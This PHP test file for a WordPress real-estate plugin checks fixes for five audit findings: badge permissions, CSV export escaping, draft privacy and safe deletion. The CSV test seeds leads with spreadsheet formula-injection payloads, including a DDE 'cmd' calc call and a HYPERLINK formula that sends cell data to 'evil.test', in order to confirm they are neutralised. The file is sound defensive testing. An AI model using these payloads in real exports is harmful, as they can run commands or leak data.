<?php
/**
 * The five faults found in the pre-launch audit, and proof each one is shut.
 *
 * @package EstatOS
 */

declare( strict_types = 1 );

use EstatOS\Admin\Actions;
use EstatOS\Admin\Screens\Partials;
use EstatOS\Csv\Spreadsheet;
use EstatOS\Data\Listings;
use EstatOS\Frontend\Components;
use EstatOS\Leads\Leads;
use EstatOS\Rest\RestApi;

estat_reset_world();
estat_login_owner();

/**
 * Run an admin action and report the notice it redirected with.
 *
 * @param string               $action Action name.
 * @param int                  $id     Record ID.
 * @param array<string,string> $extra  Extra query args.
 * @return string
 */
function estat_run_record_action( string $action, int $id, array $extra = array() ): string {
	$_REQUEST = array_merge(
		array(
			'estat_action' => $action,
			'record_id'    => $id,
			'estat_nonce'  => wp_create_nonce( 'estat_' . $action . '_' . $id ),
		),
		$extra
	);
	$_GET     = $_REQUEST;
	try {
		Actions::handle();
		return 'no-redirect';
	} catch ( Estat_Redirect_Exception $e ) {
		return preg_match( '/estat_notice=([a-z_]+)/', $e->getMessage(), $m ) ? $m[1] : 'unknown';
	}
}

/**
 * A listing to experiment on.
 *
 * @param string $title  Title.
 * @param string $status Status.
 * @return int
 */
function estat_make_listing( string $title, string $status = 'publish' ): int {
	return (int) Listings::save(
		array(
			'title'         => $title,
			'offer'         => 'sale',
			'property_type' => 'apartment',
			'locality'      => 'Saket',
			'price'         => 2500000,
			'area'          => 1000,
			'area_unit'     => 'sqft',
			'status'        => $status,
		)
	);
}

/* ============================================ BUG-4: verification badge */

EstatTests::group( 'Audit fix: only authorised staff may award the verified badge' );

estat_login_with( 7, array( 'read', 'estat_manage_listings', 'estat_publish_listings' ) );
$agent_listing = estat_make_listing( 'An agent tries to verify this flat' );
EstatTests::is(
	'',
	(string) get_post_meta( $agent_listing, '_estat_verification', true ),
	'an agent cannot award their own listing the office badge'
);

estat_login_owner();
Listings::save( array( 'verification' => 'office_verified' ), $agent_listing );
EstatTests::is(
	'office_verified',
	(string) get_post_meta( $agent_listing, '_estat_verification', true ),
	'the office owner can verify a listing'
);

estat_login_with( 7, array( 'read', 'estat_manage_listings', 'estat_publish_listings' ) );
Listings::save(
	array(
		'title'        => 'The agent edits the title once more',
		'verification' => 'unverified',
	),
	$agent_listing
);
EstatTests::is(
	'office_verified',
	(string) get_post_meta( $agent_listing, '_estat_verification', true ),
	'an agent cannot strip a badge the office awarded either'
);
EstatTests::is(
	'The agent edits the title once more',
	(string) get_post( $agent_listing )->post_title,
	'and the agent\'s ordinary edits still save normally'
);
estat_login_owner();

/* ================================== BUG-5: spreadsheet formula injection */

EstatTests::group( 'Audit fix: an export cannot run commands in Excel' );

Leads::create(
	array(
		'name'    => '=cmd|\' /C calc\'!A0',
		'phone'   => '9876543210',
		'message' => '+HYPERLINK("http://evil.test?d="&A1,"Click me")',
	)
);
Leads::create(
	array(
		'name'    => '@SUM(1+1)',
		'phone'   => '9111122222',
		'message' => "-2+3+cmd|' /C calc'!A0",
	)
);
estat_make_listing( '=1+1 formula flat in Saket' );
estat_make_listing( 'Perfectly normal flat in Saket' );

foreach ( array( 'leads', 'listings' ) as $kind ) {
	$csv       = Spreadsheet::export( $kind );
	$dangerous = 0;
	foreach ( explode( "\n", $csv ) as $line ) {
		foreach ( (array) str_getcsv( $line ) as $cell ) {
			$cell = (string) $cell;
			if ( '' !== $cell && in_array( substr( $cell, 0, 1 ), array( '=', '+', '-', '@', "\t", "\r" ), true ) ) {
				++$dangerous;
			}
		}
	}
	EstatTests::is( 0, $dangerous, 'the ' . $kind . ' export contains no cell a spreadsheet would execute' );
}

$listing_csv = Spreadsheet::export( 'listings' );
EstatTests::ok(
	false !== strpos( $listing_csv, 'Perfectly normal flat in Saket' ),
	'an ordinary title is exported exactly as it was typed'
);
EstatTests::ok(
	false !== strpos( $listing_csv, "'=1+1" ),
	'a hostile title is exported as plain text instead'
);
EstatTests::ok(
	false === strpos( $listing_csv, "'2500000" ),
	'real numbers are not mangled by the guard'
);

/* ========================================= BUG-2: draft project stats */

EstatTests::group( 'Audit fix: an unpublished project stays private' );

$draft_project = wp_insert_post(
	array(
		'post_type'   => 'estat_project',
		'post_title'  => 'An unannounced society',
		'post_status' => 'draft',
	)
);
$live_project  = wp_insert_post(
	array(
		'post_type'   => 'estat_project',
		'post_title'  => 'A launched society',
		'post_status' => 'publish',
	)
);

estat_login_with( 0, array() );

/**
 * Ask the public stats endpoint about one project.
 *
 * @param int $id Project ID.
 * @return mixed
 */
function estat_ask_project_stats( int $id ) {
	$request = new WP_REST_Request( 'GET', '/estat/v1/projects/' . $id . '/stats' );
	$request->set_param( 'id', $id );
	return RestApi::get_project_stats( $request );
}

EstatTests::ok(
	is_wp_error( estat_ask_project_stats( (int) $draft_project ) ),
	'a visitor asking about a draft project is told it does not exist'
);
EstatTests::ok(
	is_wp_error( estat_ask_project_stats( 999999 ) ),
	'and a made-up project id answers the same way, so the two cannot be told apart'
);
EstatTests::ok(
	! is_wp_error( estat_ask_project_stats( (int) $live_project ) ),
	'a published project still answers normally'
);

/* ============================================ BUG-3: draft property card */

EstatTests::group( 'Audit fix: a draft property never reaches the website' );

estat_login_owner();
$secret_draft = estat_make_listing( 'A secret draft flat for nobody', 'draft' );
$public_flat  = estat_make_listing( 'A published flat for everyone' );

estat_login_with( 0, array() );
EstatTests::is( '', Components::card( $secret_draft ), 'a visitor is shown nothing for a draft property' );
EstatTests::ok( '' !== Components::card( $public_flat ), 'a visitor still sees a published property' );

estat_login_owner();
EstatTests::ok( '' !== Components::card( $secret_draft ), 'office staff can still preview their own draft' );

/* ================================================= BUG-1: removing things */

EstatTests::group( 'Audit fix: records can be removed, and put back' );

$doomed = estat_make_listing( 'A flat we are going to remove' );

EstatTests::is(
	'error',
	estat_run_record_action( 'delete_record', $doomed, array( 'confirm' => 'DELETE' ) ),
	'something still live cannot be deleted for good in one step'
);
EstatTests::ok( null !== get_post( $doomed ), 'and it is still there afterwards' );

EstatTests::is( 'trashed', estat_run_record_action( 'trash_record', $doomed ), 'it can be moved to the bin' );
EstatTests::is( 'trash', (string) get_post( $doomed )->post_status, 'and the bin is where it goes' );

EstatTests::is( 'restored', estat_run_record_action( 'restore_record', $doomed ), 'it can be put back' );
EstatTests::is(
	'draft',
	(string) get_post( $doomed )->post_status,
	'a restored record comes back as a draft, never straight onto the website'
);

estat_run_record_action( 'trash_record', $doomed );
EstatTests::is(
	'error',
	estat_run_record_action( 'delete_record', $doomed ),
	'deleting for good is refused unless DELETE is typed'
);
EstatTests::ok( null !== get_post( $doomed ), 'so it survives a half-hearted attempt' );

EstatTests::is(
	'deleted',
	estat_run_record_action( 'delete_record', $doomed, array( 'confirm' => 'DELETE' ) ),
	'with the bin step done and DELETE typed, it is finally removed'
);
EstatTests::is( null, get_post( $doomed ), 'and it really is gone' );

/* ================================================= Removal permissions */

EstatTests::group( 'Audit fix: removing respects who you are' );

$staff_listing = estat_make_listing( 'A listing for the permission test' );
$staff_article = (int) wp_insert_post(
	array(
		'post_type'   => 'estat_insight',
		'post_title'  => 'An article for the permission test',
		'post_status' => 'publish',
	)
);

estat_login_with( 7, array( 'read', 'estat_manage_listings', 'estat_publish_listings' ) );
EstatTests::is(
	'forbidden',
	estat_run_record_action( 'trash_record', $staff_listing ),
	'an agent without delete permission cannot bin a property'
);
EstatTests::is( 'publish', (string) get_post( $staff_listing )->post_status, 'the property is untouched' );

estat_login_with( 8, array( 'read', 'estat_manage_insights' ) );
EstatTests::is(
	'trashed',
	estat_run_record_action( 'trash_record', $staff_article ),
	'a writer can bin an article, which is their own area'
);
EstatTests::is(
	'forbidden',
	estat_run_record_action( 'trash_record', $staff_listing ),
	'but the same writer cannot bin a property'
);

estat_login_owner();
$ordinary_page = (int) wp_insert_post(
	array(
		'post_type'   => 'page',
		'post_title'  => 'An ordinary website page',
		'post_status' => 'publish',
	)
);
EstatTests::is(
	'error',
	estat_run_record_action( 'trash_record', $ordinary_page ),
	'the plugin refuses to touch a page that is not one of its own records'
);
EstatTests::is( 'publish', (string) get_post( $ordinary_page )->post_status, 'the page is left alone' );

$nonce_target             = estat_make_listing( 'A listing behind a bad link' );
$_REQUEST                 = array(
	'estat_action' => 'trash_record',
	'record_id'    => $nonce_target,
	'estat_nonce'  => 'not-a-real-nonce',
);
$_GET                     = $_REQUEST;
$blocked_by_expired_nonce = false;
try {
	Actions::handle();
} catch ( Estat_Die_Exception $e ) {
	$blocked_by_expired_nonce = true;
} catch ( Estat_Redirect_Exception $e ) {
	$blocked_by_expired_nonce = true;
}
EstatTests::ok( $blocked_by_expired_nonce, 'a stale or forged remove link is refused' );
EstatTests::is( 'publish', (string) get_post( $nonce_target )->post_status, 'and nothing was removed by it' );

/* ============================================== The buttons are on screen */

EstatTests::group( 'Audit fix: the buttons actually exist on the screens' );

ob_start();
Partials::record_actions( $nonce_target, 'publish' );
$live_buttons = (string) ob_get_clean();

ob_start();
Partials::record_actions( $nonce_target, 'trash' );
$bin_buttons = (string) ob_get_clean();

EstatTests::ok( false !== strpos( $live_buttons, 'estat_action=trash_record' ), 'a live record offers Remove' );
EstatTests::ok( false === strpos( $live_buttons, 'delete_record' ), 'a live record does not offer a permanent delete' );
EstatTests::ok( false !== strpos( $live_buttons, 'data-estat-confirm' ), 'and Remove asks for confirmation first' );
EstatTests::ok( false !== strpos( $bin_buttons, 'estat_action=restore_record' ), 'a binned record offers Put back' );
EstatTests::ok( false !== strpos( $bin_buttons, 'estat_action=delete_record' ), 'a binned record offers Delete for good' );
EstatTests::ok( false !== strpos( $bin_buttons, 'confirm=DELETE' ), 'and that link carries the typed confirmation' );

$screens = array(
	'ListingsScreen' => 'estat-listings',
	'ProjectsScreen' => 'estat-projects',
	'TeamScreen'     => 'estat-team',
	'InsightsScreen' => 'estat-insights',
);
foreach ( $screens as $class => $page ) {
	$source = (string) file_get_contents( ESTAT_DIR . 'includes/Admin/Screens/' . $class . '.php' );
	EstatTests::ok(
		false !== strpos( $source, 'record_actions(' ),
		'the ' . $page . ' screen offers a way to remove a record'
	);
}

$listings_source = (string) file_get_contents( ESTAT_DIR . 'includes/Admin/Screens/ListingsScreen.php' );
EstatTests::ok(
	false !== strpos( $listings_source, "'trash'   => __( 'In the bin'" ),
	'and the listings screen lets you look inside the bin'
);
